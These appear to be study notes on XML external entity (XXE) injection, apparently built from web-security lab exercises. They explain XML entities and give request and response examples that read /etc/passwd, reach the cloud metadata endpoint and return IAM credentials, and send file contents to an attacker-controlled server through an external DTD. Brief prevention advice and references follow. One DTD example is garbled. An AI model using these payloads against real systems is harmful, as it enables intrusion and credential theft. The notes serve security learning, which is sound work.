# XXE Injection
---

## Prerequisites
**Extensible Markup Language (XML)**
XML is a markup language for storing, transmitting, and reconstructing data.
* XML applications will work as expected even if new data is added (or removed).
* A human readable language that uses tags to define elements within a document.
* A human readable language that uses tags to define elements within a document. 

```xml
1 <?xml version="1.0" encoding="UTF-8"?>
2 <bookstore>
3 <book category="web security">
4 <title>Web Application Hacker&apos;s Handbook</title>
5 <author>Dafydd Stuttard and Marcus Pinto</author>
6 <year>2011</year>
7 </book>
8 <book category="penetration testing">
9 <title>The Hacker Playbook 3</title>
10 <author>Peter Kim</author>
11 <year>2018</year>
12 </book>
13 </bookstore>
```
* Line 1 - XML declaration
* Line 2 - Root element
* Line 3 - Child element

**XML Entities** 
XML entities are a way of representing an item of data within an XML document, instead of using the data itself.
```xml
1 <?xml version="1.0" encoding="UTF-8"?>
2 <!DOCTYPE bookstore [
3 <!ENTITY name "Peter Kim">
4 ]>
5 <bookstore>
6 <book category="penetration testing">
7 <title>The Hacker Playbook 3</title>
8 <author>&name;</author>
9 </book>
10 </bookstore>
```
* Line 2-4 - Document Type Definition (DTD)
* Line 3 - Entity
* Line 8 - Entity reference

**Different types of entities** 
* Internal
* External
* Parameter 
* Predefined

**Internal Entities** 
An entity that is defined locally within a DTD. It is used to get rid of typing the same content again and again

```xml
1 <?xml version="1.0" encoding="UTF-8"?>
2 <!DOCTYPE bookstore [
3 <!ENTITY name "Peter Kim">
4 ]>
5 <bookstore>
6 <book category="penetration testing">
7 <title>The Hacker Playbook 3</title>
8 <author>&name;</author>
9 </book>
10 </bookstore>
```
**External Entities**
An entity that is defined outside of the DTD where it is declared. It is used to divide the document into logical chunks.

```xml
1 <?xml version="1.0" encoding="UTF-8"?>
2 <!DOCTYPE stockcheck [
3 <!ENTITY product SYSTEM "file:///var/www/html/product.txt">
4 ]>
5 <stockcheck>
6 <productId>&product;</productId>
7 </stockcheck>
```

**Parameter Entities**
A special kind of XML entity which can only be referenced exclusively within the DTD.

```xml
1 <?xml version="1.0" encoding="UTF-8"?>
2 <!DOCTYPE stockcheck [
3 <!ENTITY % paramEntity "entity value"> %paramEntity;
4 ]>
5 <stockcheck>
6 <productId>test</productId>
7 </stockcheck>
```

---

## What Is XXE Injection?
Vulnerability that allows an attacker to interfere with an application's processing of XML data.

Example:
* Vulnerable Request
```xml
POST /product/stock HTTP/2
...
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>
17
</productId>
<storeId>
1
</storeId>
</stockCheck>
```
* Attacker Request
```xml
POST /product/stock HTTP/2
...
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
<productId>
&xxe;
</productId>
<storeId>
1
</storeId>
</stockCheck>
```
* Response
```xml
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2292
"Invalid product ID:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:6c0:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
```

### Types of XXE Injection

#### In-Band XXE Injection
* Occurs when the attacker can receive a direct response on the screen to the XXE payload
#### Out-Of-Band XXE Injection
* Occurs when the attacker does not receive a direct response on the screen to the XXE payload. Instead, the attacker triggers the response to be sent to an out-of-band attacker-controller server
#### Error XXE Injection
* Occurs when the attacker can infer the response of the XXE payload based on manipulating the application to generate an error

### Impact Of XXE Injection vulnerabilities
* Unauthorized access to the application
    * <b>C</b>onfidentiality - Allows you to read files on the system
    * <b>I</b>ntegrity - Usually not affected unless you escalate the XXE attack to compromise the underlying server
    * <b>A</b>vailability - Allows you to perform a denial-of-service (DoS) attack, referred to as an XML bomb or a billion laughs attack
---
## How To Find XXE Injection?

### Black-Box Testing
* Map the application
    * Identify all visible instances in the application where client supplied input is parsed as XML code
    * Inject XML metacharacters, such as single quote, double quote, angle brackets, etc, to see if an error is thrown in the application that indicates if the application is using an XML parser
    * Automate testing using a WAVS
* Test identified instances with XML payloads to have the application retrieve a publicly readable file from the backend server
    * In-Band XXE Injection
    * Out-Of-Band XXE Injection
    * Error Based XXE Injection

### White-Box Testing
* Identify all instances in the application code where client supplied input is parsed as XML code
    * For those instances, identify if the XML parser disables DTDs and/or external entities
* Validate potential XXE injection vulnerabilities on a running application

---

## How To Exploit XXE Injection?

**Vulnerable Application**
* Request: 
```xml
POST /product/stock HTTP/2
...
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>
17
</productId>
<storeId>
1
</storeId>
</stockCheck>
```
* Response:
```xml
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3
354
```
#### Retrieve Sensitive Data In Response
* Request
```xml
POST /product/stock HTTP/2
...
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM
"file:///etc/passwd">]>
<stockCheck>
<productId>
&xxe;
</productId>
<storeId>
1
</storeId>
</stockCheck>
```
* Response
```xml
HTTP/2 400 Bad Request
Content-Type: application/json;
charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2338
"Invalid product ID:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nol
ogin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
```

#### Exploit XXE Injection To Perform SSRF Attack
* Request
```xml
POST /product/stock HTTP/2
...
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM
"http://169.254.169.254/"> ]>
<stockCheck>
<productId>
&xxe;
</productId>
<storeId>
1
</storeId>
</stockCheck>
```
* Response
```xml
HTTP/2 400 Bad Request
Content-Type: application/json;
charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 30
"Invalid product ID:
latest
"
```

* Request
```xml
POST /product/stock HTTP/2
...
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM
"http://169.254.169.254/latest"> ]>
<stockCheck>
<productId>
&xxe;
</productId>
<storeId>
1
</storeId>
</stockCheck>
```
* Response
```xml
HTTP/2 400 Bad Request
Content-Type: application/json;
charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 30
"Invalid product ID:
meta-data
"
```

* Request
```xml
POST /product/stock HTTP/2
...
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM
"http://169.254.169.254/latest/meta-
data/iam/security-credentials/admin">]>
<stockCheck>
<productId>
&xxe;
</productId>
<storeId>
1
</storeId>
</stockCheck>
```
* Response
```xml
HTTP/2 400 Bad Request
Content-Type: application/json;
charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 554
"Invalid product ID:
{
"Code" : "Success",
"Type" : "AWS-HMAC",
"AccessKeyId" : "P3A39PNDNgjytg9u6OfE",
"SecretAccessKey" :
"JgNDdDK6aOFCVkA8shPlr4t9saM0wVo63KGimF1F",
"Token" :
"SKh40MomJcV3zUyrlr9j26Cl5dTs6jWvVU3jmztTiG
...
```

#### Exfiltrate Sensitive Data To An Attacker Server

* Request
```xml
POST /product/stock HTTP/2
...
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM
"http://5697t6jfs9qkgsaggzopz5qjgam1aty
i.oastify.com"> ]>
<stockCheck>
<productId>
&xxe;
</productId>
<storeId>
1
</storeId>
</stockCheck>
```

* Response
```xml
HTTP/2 400 Bad Request
Content-Type: application/json;
charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20
"Invalid product ID"
```

* Attacker Controlled Server - Received PING

* Request
```xml
POST /product/stock HTTP/2
...
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY % xxe SYSTEM
"http://5697t6jfs9qkgsaggzopz5qjgam1aty
i.oastify.com"> %xxe; ]>
<stockCheck>
<productId>
17
</productId>
<storeId>
1
</storeId>
</stockCheck>
```
* Response
```xml
HTTP/2 400 Bad Request
Content-Type: application/json;
charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20
"XML parsing error"
```

* Request
```xml
POST /product/stock HTTP/2
...
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY % xxe SYSTEM
"https://exploit-
server.net/external.dtd"> %xxe; ]>
<stockCheck>
<productId>
17
</productId>
<storeId>
1
</storeId>
</stockCheck>
```

* external.dtd

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM
'https://exploit-server.net/?x=%file;'>">
%eval;
%exfil;
```

* Request
```xml
POST /product/stock HTTP/2
...
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY % xxe SYSTEM
"https://exploit-
server.net/external.dtd"> %xxe; ]>
<stockCheck>
<productId>
17
</productId>
<storeId>
1
</storeId>
</stockCheck>
```

* external.dtd

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM
'https://exploit-server.net/?x=%file;'>">
<!ENTITY &#x25; exfil SYSTEM 'https://exploit-
server.net/?x=?content_of_hostname_file'>">
%exfil;
```

* Attacker Controlled Server -> Received content of hostname file

#### Exploiting XInclude To Retrieve Files
XInclude is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an XInclude attack within any data value in an XML document.

* Request
```xml 
POST /product/stock HTTP/2
...
productId=1&storeId=1
```

* Response
```xml
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3
107
```

* Request
```xml
POST /product/stock HTTP/2
...
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
* Response
```xml
HTTP/2 400 Bad Request
...
"Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
```

---

## How To Prevent XXE Injection?
The best way to prevent XXE Injection vulnerabilities is to disable dangerous XML features that the application does not need or intend to use.
* Disable resolution of external entities and disable support for XInclude

--- 

## Resources
* [XML Tutorial](https://www.w3schools.com/xml/default.asp)
* [Web Security Academy – XML External Entity (XXE) Injection](https://portswigger.net/web-security/xxe)
* [OWASP Web Security Testing Guide – Testing for XML Injection](https://owasp.org/www-project-web-security-testing-guide/)
* [OWASP XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
* [PwnFunction – XML External Entities (XXE) Explained](https://www.youtube.com/watch?v=gjm6VHZa_8s&ab_channel=PwnFunction)